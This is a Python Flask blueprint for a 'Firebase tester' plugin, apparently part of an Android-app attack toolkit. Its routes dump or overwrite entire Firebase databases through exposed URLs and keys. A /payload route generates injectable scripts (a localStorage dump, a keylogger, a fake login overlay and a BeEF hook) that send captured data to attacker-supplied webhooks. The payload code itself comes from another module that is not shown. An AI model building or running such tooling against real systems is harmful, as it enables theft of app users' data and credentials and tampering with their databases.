"""Flask blueprint for the built-in Firebase tester plugin."""
from __future__ import annotations

import base64
import io
import json
from pathlib import Path
from typing import Any, Dict

from flask import (
    Blueprint,
    abort,
    jsonify,
    render_template,
    request,
    send_file,
)

from apk_web.auth import login_required
from apk_web.plugins.firebase.client import FirebaseClient, FirebaseError
from apk_web.plugins.firebase.payloads import (
    PAYLOAD_KINDS,
    beef_hook,
    fake_login_overlay,
    keylogger,
    localstorage_dump,
)

bp = Blueprint(
    "firebase",
    __name__,
    template_folder=str(Path(__file__).resolve().parent / "templates"),
)


@bp.route("/", methods=["GET"])
@login_required
def index():
    prefill = _decode_prefill(request.args.get("prefill"))
    return render_template(
        "firebase/index.html",
        plugin={"name": "Firebase tester", "source": "builtin", "version": "1.0.0"},
        prefill=prefill or {},
        payload_kinds=PAYLOAD_KINDS,
    )


@bp.route("/test", methods=["POST"])
@login_required
def test_connection():
    body = request.get_json(silent=True) or {}
    db_url = (body.get("db_url") or "").strip()
    api_key = (body.get("api_key") or "").strip() or None
    if not db_url:
        return jsonify({"ok": False, "error": "db_url is required"}), 400
    client = FirebaseClient(db_url, api_key)
    try:
        status, parsed = client.get("/")
    except FirebaseError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 502
    return jsonify(
        {
            "ok": 200 <= status < 300,
            "status": status,
            "auth": bool(api_key),
            "rules_locked": status in (401, 403),
            "preview": _preview(parsed),
        }
    )


@bp.route("/request", methods=["POST"])
@login_required
def custom_request():
    body = request.get_json(silent=True) or {}
    db_url = (body.get("db_url") or "").strip()
    api_key = (body.get("api_key") or "").strip() or None
    method = (body.get("method") or "GET").strip().upper()
    path = (body.get("path") or "/").strip()
    payload_raw = body.get("body")
    if method not in {"GET", "POST", "PUT", "PATCH", "DELETE"}:
        return jsonify({"ok": False, "error": f"unsupported method {method}"}), 400
    if not db_url:
        return jsonify({"ok": False, "error": "db_url is required"}), 400

    parsed_body: Any = None
    if payload_raw not in (None, ""):
        if isinstance(payload_raw, (dict, list)):
            parsed_body = payload_raw
        else:
            try:
                parsed_body = json.loads(str(payload_raw))
            except json.JSONDecodeError as exc:
                return jsonify({"ok": False, "error": f"invalid JSON body: {exc}"}), 400

    client = FirebaseClient(db_url, api_key)
    try:
        status, parsed = client.request(method, path, parsed_body)
    except FirebaseError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 502
    return jsonify(
        {
            "ok": 200 <= status < 300,
            "status": status,
            "body": parsed,
        }
    )


@bp.route("/dump", methods=["POST"])
@login_required
def dump():
    """Download a JSON dump of the whole database (subject to rules)."""
    db_url = (request.form.get("db_url") or "").strip()
    api_key = (request.form.get("api_key") or "").strip() or None
    if not db_url:
        return jsonify({"ok": False, "error": "db_url is required"}), 400
    client = FirebaseClient(db_url, api_key)
    try:
        status, parsed = client.dump()
    except FirebaseError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 502
    if status >= 400:
        return jsonify({"ok": False, "status": status, "body": parsed}), status
    blob = json.dumps(parsed, indent=2, ensure_ascii=False).encode("utf-8")
    return send_file(
        io.BytesIO(blob),
        mimetype="application/json",
        as_attachment=True,
        download_name="firebase_dump.json",
    )


@bp.route("/restore", methods=["POST"])
@login_required
def restore():
    db_url = (request.form.get("db_url") or "").strip()
    api_key = (request.form.get("api_key") or "").strip() or None
    target_path = (request.form.get("path") or "/").strip()
    if not db_url:
        return jsonify({"ok": False, "error": "db_url is required"}), 400
    if "file" not in request.files:
        return jsonify({"ok": False, "error": "JSON file is required"}), 400
    raw = request.files["file"].read()
    try:
        payload = json.loads(raw.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        return jsonify({"ok": False, "error": f"invalid JSON file: {exc}"}), 400
    if not isinstance(payload, dict):
        return jsonify({"ok": False, "error": "JSON root must be an object"}), 400
    client = FirebaseClient(db_url, api_key)
    try:
        status, parsed = client.restore(payload, path=target_path)
    except FirebaseError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 502
    return jsonify({"ok": 200 <= status < 300, "status": status, "body": parsed})


@bp.route("/payload", methods=["POST"])
@login_required
def payload():
    body = request.get_json(silent=True) or {}
    kind = (body.get("kind") or "").strip()
    webhooks = [w for w in (body.get("webhooks") or []) if str(w or "").strip()]
    if kind == "localstorage_dump":
        out = localstorage_dump(webhooks)
    elif kind == "keylogger":
        out = keylogger(webhooks)
    elif kind == "fake_login":
        out = fake_login_overlay(webhooks)
    elif kind == "beef_hook":
        hook = str(body.get("hook_url") or "").strip()
        if not hook:
            return jsonify({"ok": False, "error": "hook_url is required"}), 400
        out = beef_hook(hook)
    else:
        return jsonify({"ok": False, "error": f"unknown kind: {kind}"}), 400
    return jsonify({"ok": True, "kind": kind, "payload": out, "length": len(out)})


# ---------------------------------------------------------------------------
# helpers


def _preview(value: Any, *, max_keys: int = 20, max_chars: int = 800) -> Any:
    if isinstance(value, dict):
        out = {}
        for k, v in list(value.items())[:max_keys]:
            out[str(k)] = _preview(v, max_keys=max_keys, max_chars=max_chars)
        if len(value) > max_keys:
            out["__truncated__"] = f"{len(value) - max_keys} more keys"
        return out
    if isinstance(value, list):
        return [_preview(v, max_keys=max_keys, max_chars=max_chars) for v in value[:max_keys]]
    if isinstance(value, str):
        return value if len(value) <= max_chars else value[:max_chars] + "..."
    return value


def _decode_prefill(raw: str | None) -> Dict[str, Any] | None:
    if not raw:
        return None
    try:
        padded = raw + "=" * (-len(raw) % 4)
        data = base64.urlsafe_b64decode(padded.encode("ascii")).decode("utf-8")
        parsed = json.loads(data)
        if isinstance(parsed, dict):
            return parsed
    except Exception:  # noqa: BLE001
        return None
    return None
